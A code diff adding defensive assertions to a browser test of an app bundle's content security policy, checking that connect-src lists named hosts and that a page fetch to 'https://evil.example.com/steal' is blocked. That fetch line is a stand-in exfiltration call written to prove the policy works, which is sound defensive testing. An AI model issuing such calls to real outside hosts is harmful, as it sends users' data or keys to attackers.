@@ -330,6 +330,11 @@ test('the bundle carries its own content security policy', async ({ page }) => {
     expect(policy).toMatch(/script-src 'self'\s*;/);
     expect(policy).toContain("object-src 'none'");
     expect(policy).toContain("base-uri 'self'");
+    // A closed connect-src list is what stops a stolen API key from being posted
+    // anywhere. The app, unlike the website, never reaches ?gpx_url=, so it can
+    // afford to name its hosts. Bare `https:` would give that away.
+    expect(policy).toMatch(/connect-src 'self' https:\/\/\S/);
+    expect(policy).not.toMatch(/connect-src[^;]*https:(?:\s|;|$)/);
   }
 
   // It has to actually apply, not merely be present.
@@ -348,4 +353,11 @@ test('the bundle carries its own content security policy', async ({ page }) => {
 
   expect(await page.evaluate(() => window.__pwned)).toBeUndefined();
   expect(await page.evaluate(() => window.__blocked)).toContain('script-src-attr');
+
+  // And the page cannot talk to a host the policy does not name.
+  await page.evaluate(() =>
+    fetch('https://evil.example.com/steal', { mode: 'no-cors' }).catch(() => {})
+  );
+  await page.waitForTimeout(300);
+  expect(await page.evaluate(() => window.__blocked)).toContain('connect-src');
 });
